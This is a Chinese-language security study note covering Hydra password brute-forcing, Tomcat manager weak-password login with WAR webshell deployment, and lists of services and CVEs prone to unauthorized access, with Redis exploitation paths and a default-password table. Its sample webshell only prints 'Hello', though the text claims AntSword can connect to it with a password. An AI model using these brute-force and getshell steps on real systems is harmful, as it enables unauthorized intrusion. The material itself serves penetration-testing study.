---
title: "弱口令与未授权访问"
published: 2026-09-23T23:00:00+08:00
description: "Hydra 服务爆破、Tomcat 后台弱口令 getshell，以及未授权访问漏洞清单与挖掘思路。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、服务弱口令爆破（Hydra）

### 1.1 基本用法

Hydra 是一款支持多种协议的爆破工具。

```bash
hydra -L 用户名字典 -P 密码字典 -t 线程数 服务://目标IP:端口
```

### 1.2 常见服务爆破命令

| 服务       | 端口 | 命令示例                                                     |
| ---------- | ---- | ------------------------------------------------------------ |
| **SSH**    | 22   | `hydra -L user.txt -P pass.txt -t 20 ssh://192.168.198.131:22` |
| **RDP**    | 3389 | `hydra -L user.txt -P pass.txt -t 20 rdp://192.168.68.137:3389` |
| **FTP**    | 21   | `hydra -L user.txt -P pass.txt -t 20 ftp://192.168.198.133:21` |
| **SMB**    | 445  | `hydra -L user.txt -P pass.txt -t 20 smb://192.168.198.133:445` |
| **Telnet** | 23   | `hydra -L user.txt -P pass.txt -t 20 telnet://192.168.198.133:23` |

⚠️ RDP 爆破存在误报情况，需注意验证。

------

## 二、Tomcat 后台弱口令 Getshell

### 2.1 场景

Tomcat 管理后台（`/manager/html`）存在弱口令，登录后可通过部署 WAR 包获取服务器权限。

### 2.2 MSF 爆破模块

```bash
msf6 > search tomcat
# 使用弱口令爆破模块
msf6 > use auxiliary/scanner/http/tomcat_mgr_login

# 查看配置
msf6 > show options

# 设置参数
msf6 > set RHOSTS 目标IP
msf6 > set RPORT 目标端口
msf6 > run
```

### 2.3 上传 WAR 包 Getshell

**Step 1：制作 WAR 包**

```bash
# 创建 Webshell 文件（如 goodman.jsp）
echo '<% out.println("Hello"); %>' > goodman.jsp

# 打包为 WAR 文件
jar cvf shell.war goodman.jsp
```

**Step 2：登录 Tomcat 后台**

```plain
http://目标IP:端口/manager/html
```

**Step 3：部署 WAR 包**

- 找到 "WAR file to deploy" 部分
- 选择 `shell.war` 文件
- 点击 Deploy

**Step 4：访问 Webshell**

```plain
http://目标IP:端口/shell/goodman.jsp
```

💡 蚁剑连接：`http://xxx:xxx/shell/goodman.jsp`，密码 `passwd`

------

## 三、未授权访问漏洞

### 3.1 什么是未授权访问？

系统或服务**未配置认证机制**或**认证绕过**，攻击者无需凭证即可访问敏感资源。

### 3.2 常见端口与服务对照

| 端口       | 服务          | 说明                 |
| ---------- | ------------- | -------------------- |
| 20, 21     | FTP           | 文件传输协议         |
| 22         | SSH           | 安全 Shell           |
| 23         | Telnet        | 远程登录（明文）     |
| 80, 443    | HTTP/HTTPS    | Web 服务             |
| 445        | SMB           | Windows 文件共享     |
| 873        | Rsync         | 文件远程同步         |
| 1433       | MSSQL         | Microsoft SQL Server |
| 1521       | Oracle        | Oracle 数据库        |
| 20880      | Dubbo         | 分布式服务框架       |
| 27017      | MongoDB       | NoSQL 数据库         |
| 3306       | MySQL         | MySQL 数据库         |
| 4848       | GlassFish     | 管理端口             |
| 5432, 5433 | PostgreSQL    | PostgreSQL 数据库    |
| 6379       | Redis         | NoSQL 数据库         |
| 6627       | Storm         | Nimbus 默认端口      |
| 8080       | Jenkins       | 持续集成管理工具     |
| 8080       | JBoss         | Java 中间件          |
| 8080       | Storm UI      | Storm Web 端口       |
| 9200       | Elasticsearch | 管理端口             |
| 9300       | Elasticsearch | 服务端口             |
| 11211      | Memcached     | 分布式内存缓存       |

------

## 四、历史未授权访问漏洞清单

### 4.1 2017 年左右大量发现的漏洞（重点）

| 序号 | 漏洞                        | 组件/服务   | 说明                       |
| ---- | --------------------------- | ----------- | -------------------------- |
| 1    | Redis 未授权访问            | Redis       | NoSQL 数据库，6379 端口    |
| 2    | MongoDB 未授权访问          | MongoDB     | NoSQL 数据库，27017 端口   |
| 3    | Memcached 未授权访问        | Memcached   | 分布式缓存，11211 端口     |
| 4    | JBoss 未授权访问            | JBoss       | Java 中间件，8080 端口     |
| 5    | VNC 未授权访问              | VNC         | 远程控制工具               |
| 6    | Docker 未授权访问           | Docker      | 容器管理工具               |
| 7    | ZooKeeper 未授权访问        | ZooKeeper   | 分布式协调服务             |
| 8    | Rsync 未授权访问            | Rsync       | 文件同步工具，873 端口     |
| 9    | Hadoop 未授权访问           | Hadoop      | 大数据系统                 |
| 10   | Jenkins 未授权访问          | Jenkins     | CI/CD 工具，8080 端口      |
| 11   | CouchDB 未授权访问          | CouchDB     | NoSQL 数据库               |
| 12   | LDAP 未授权访问             | LDAP        | 认证服务                   |
| 13   | ActiveMQ 未授权访问         | ActiveMQ    | 消息队列                   |
| 14   | Jupyter Notebook 未授权访问 | Jupyter     | 笔记/代码运行              |
| 15   | Kibana 未授权访问           | Kibana      | 数据可视化（ELK）          |
| 16   | RabbitMQ 未授权访问         | RabbitMQ    | 消息队列                   |
| 17   | Spring Boot Actuator 未授权 | Spring Boot | 监控功能                   |
| 18   | FTP 未授权访问              | FTP         | 文件传输                   |
| 19   | Dubbo 未授权访问            | Dubbo       | 分布式服务框架，20880 端口 |
| 20   | NFS 未授权访问              | NFS         | 网络文件系统               |
| 21   | Druid 未授权访问            | Druid       | 数据库连接池               |
| 22   | Windows IPC 共享未授权      | Windows     | 文件共享                   |
| 23   | 宝塔未授权访问              | 宝塔面板    | PHP 服务器管理面板         |
| 24   | PHP-FPM Fastcgi 未授权      | PHP-FPM     | PHP 解析服务               |
| 25   | WebLogic 未授权访问         | WebLogic    | Java 中间件                |

### 4.2 近年漏洞（2022-2024）

| 漏洞                  | 编号           | 说明             |
| --------------------- | -------------- | ---------------- |
| Nacos 未授权访问      | —              | 阿里配置中心     |
| 1Panel 未授权访问     | CVE-2024-27288 | 服务器管理面板   |
| Apache Shiro          | CVE-2022-32532 | Java 安全框架    |
| Zabbix                | CVE-2022-23134 | 监控系统         |
| Zimbra                | CVE-2022-27925 | 邮件系统         |
| CloudPanel RCE        | CVE-2023-35885 | 服务器管理面板   |
| WebLogic 未授权 RCE   | CVE-2023-21839 | Java 中间件      |
| Joomla 未授权访问     | CVE-2023-23752 | CMS 系统         |
| WinRAR 命令执行       | CVE-2023-38831 | 压缩软件         |
| JumpServer 未授权访问 | CVE-2023-42442 | 堡垒机           |
| Jenkins 文件读取      | CVE-2024-23897 | CI/CD 工具       |
| Confluence 未授权     | CVE-2023-22515 | 协同工具         |
| QNAP RCE              | CVE-2024-27130 | NAS 设备         |
| Splunk 文件读取       | CVE-2024-36991 | 日志分析         |
| 微软 RDP 认证漏洞     | CVE-2024-38077 | Windows 远程桌面 |

------

## 五、Redis 未授权访问（典型复现）

### 5.1 检测

```bash
# 连接 Redis
redis-cli -h 目标IP -p 6379

# 如果不需要认证，则存在未授权访问
192.168.x.x:6379> INFO
```

### 5.2 利用方式

| 方式          | 说明                |
| ------------- | ------------------- |
| 读取敏感数据  | `GET key`、`KEYS *` |
| 写入 SSH 公钥 | 免密登录服务器      |
| 写入 Webshell | 结合 Web 路径       |
| 写入 Crontab  | 反弹 Shell          |
| 写启动项      | Windows 开机自启    |

### 5.3 防御

```bash
# 设置密码
requirepass 强密码

# 绑定 IP
bind 127.0.0.1
```

------

## 六、挖掘思路

### 6.1 端口扫描

```plain
1. 使用 Nmap 扫描目标端口
2. 识别开放端口对应的服务
3. 尝试使用默认账号密码或空密码登录
4. 查找是否存在历史未授权漏洞
```

### 6.2 搜索技巧

在 **搜狗微信搜索**（https://weixin.sogou.com/）搜索：

```plain
"存在未授权访问漏洞" 组件名
"未授权访问" 漏洞复现
```

------

## 📌 快速参考卡片

### Hydra 爆破模板

```bash
hydra -L 用户字典 -P 密码字典 -t 线程数 服务://IP:端口
```

### 常见弱口令

| 用户名  | 密码    |
| ------- | ------- |
| admin   | admin   |
| admin   | 123456  |
| root    | root    |
| root    | 123456  |
| tomcat  | tomcat  |
| manager | manager |

### 未授权漏洞检测流程

```plain
1. 端口扫描 → 发现开放端口
2. 识别服务 → 根据端口判断服务类型
3. 尝试连接 → 使用对应客户端连接（Redis-cli、MongoDB Shell 等）
4. 确认漏洞 → 无需认证可操作
5. 利用 → 写入 Webshell/SSH 公钥/反弹 Shell
```

### 需重点复现的漏洞

- Redis 未授权访问
- Jenkins 未授权访问 (CVE-2024-23897)
- WebLogic 未授权访问 (CVE-2023-21839)
- JumpServer 未授权访问 (CVE-2023-42442)
- Joomla 未授权访问 (CVE-2023-23752)
